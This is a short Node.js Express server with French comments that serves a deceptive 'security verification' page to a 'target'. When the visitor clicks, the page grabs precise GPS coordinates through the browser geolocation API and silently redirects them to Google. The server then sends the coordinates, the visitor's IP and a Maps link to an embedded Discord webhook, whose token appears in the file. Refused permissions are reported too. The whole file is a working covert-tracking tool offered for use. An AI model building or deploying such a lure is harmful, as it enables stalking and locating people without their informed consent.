const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// URL de ton Webhook Discord
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";

app.use(express.json());

// 1. Page d'accueil consultée par la cible
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Vérification de sécurité</title>
            <style>
                body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f9; margin: 0; }
                .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
                button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 15px; }
                button:hover { background: #0056b3; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>Vérification d'accès</h2>
                <p>Veuillez autoriser la vérification pour accéder au contenu sécurisé.</p>
                <button onclick="obtenirLocalisation()">Continuer</button>
            </div>

            <script>
                function envoyerDonnees(coords) {
                    fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(coords)
                    }).then(() => {
                        // Redirection transparente après capture
                        window.location.href = "https://www.google.com";
                    });
                }

                function obtenirLocalisation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                envoyerDonnees({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    precision: position.coords.accuracy
                                });
                            },
                            (error) => {
                                // Si refusé, on signale quand même la visite
                                envoyerDonnees({ erreur: "Permission refusée par l'utilisateur" });
                            },
                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                        );
                    } else {
                        envoyerDonnees({ erreur: "Géolocalisation non supportée" });
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// 2. Route de réception des coordonnées GPS
app.post('/api/location', async (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    let messageContent = "";

    if (data.lat && data.lon) {
        const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
        messageContent = `🚨 **POSITION GPS EXACTE CAPTURÉE !**\n\n` +
                         `📍 **Latitude :** ${data.lat}\n` +
                         `📍 **Longitude :** ${data.lon}\n` +
                         `🎯 **Précision :** +/- ${Math.round(data.precision)} mètres\n` +
                         `🗺️ **Lien Google Maps :** ${mapsUrl}\n` +
                         `🌐 **IP :** \`${ip}\``;
    } else {
        messageContent = `⚠️ **Visite détectée mais GPS refusé**\n` +
                         `🌐 **IP :** \`${ip}\`\n` +
                         `❌ **Raison :** ${data.erreur || 'Inconnue'}`;
    }

    // Envoi sur Discord
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: messageContent })
        });
    } catch (err) {
        console.error("Erreur d'envoi Discord :", err);
    }

    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Serveur prêt sur le port ${PORT}`));
